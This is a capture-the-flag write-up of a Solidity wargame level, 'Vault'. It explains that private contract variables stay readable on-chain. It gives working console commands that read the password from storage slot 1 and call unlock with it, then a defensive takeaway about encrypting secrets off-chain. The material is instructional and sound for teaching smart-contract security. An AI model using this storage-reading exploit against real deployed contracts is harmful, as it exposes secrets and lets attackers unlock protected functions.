# Level 8: Vault

**Difficulty:** Easy

**Vulnerability:** Private state variables are publicly readable on-chain

## How it Works

The Vault contract stores a `bytes32` password in a `private` state variable and uses it to gate an `unlock` function. The goal is to call `unlock` with the correct password.

```solidity
contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```

The word `private` in Solidity only prevents other contracts from reading the variable. It does nothing to hide the data from anyone inspecting the blockchain directly. Every storage slot in a contract is publicly readable.

Ethereum contracts store state variables in numbered slots starting at 0. `locked` is slot 0, and `password` is slot 1.

## Exploit Steps

1. Read slot 1 of the contract's storage directly from the browser console:
```js
await web3.eth.getStorageAt(contract.address, 1)
// 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
```
2. Pass that value to `unlock`:
```js
await contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
```
3. Verify:
```js
await contract.locked()
// false
```
4. Submit the instance.

## Key Takeaway

`private` is a Solidity access modifier, not encryption. It controls which contracts can call or read something at the language level, but the underlying storage slot is always publicly visible on the blockchain.

If data genuinely needs to be secret, it must be encrypted off-chain before being stored. The decryption key should never touch the chain. For use cases like proving you know a password without revealing it, zk-SNARKs let you prove knowledge of a value mathematically without exposing the value itself.

**Vulnerability category:** Sensitive data exposure / Storage visibility misconception
